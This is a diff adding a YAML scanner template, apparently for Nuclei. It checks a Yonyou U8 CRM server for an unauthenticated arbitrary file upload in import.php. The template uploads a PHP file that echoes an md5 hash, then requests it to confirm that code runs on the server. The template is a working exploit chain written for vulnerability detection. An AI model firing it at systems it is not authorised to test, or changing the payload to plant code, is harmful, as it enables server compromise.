@@ -1,0 +1,58 @@
+id: poc-yaml-yongyon-u8-crm-import-php-anyfile-upload
+
+info:
+  name: 用友U8CRM import.php 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    用友U8CRM import.php 任意文件上传漏洞允许攻击者上传任意文件到服务器。此漏洞可被利用以上传恶意PHP文件并在服务器上执行。
+
+variables:
+  t1: '{{rand_int(1000, 10000)}}'
+  t2: '{{md5(t1)}}'
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - '{{BaseURL}}/crmtools/tools/import.php?DontCheckLogin=1&issubmit=1'
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye0z8QbHs79gL8vW5
+    body: |-
+      ------WebKitFormBoundarye0z8QbHs79gL8vW5
+      Content-Disposition: form-data; name="xfile"; filename="11.xls"
+
+      <?php echo md5({{t1}});?>
+      ------WebKitFormBoundarye0z8QbHs79gL8vW5
+      Content-Disposition: form-data; name="combo"
+
+      {{t1}}.php
+      ------WebKitFormBoundarye0z8QbHs79gL8vW5--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"success":true'
+          - 'Database error'
+
+  - id: verify-upload
+    method: GET
+    path:
+      - '{{BaseURL}}/tmpfile/{{t1}}.php'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '{{t2}}'
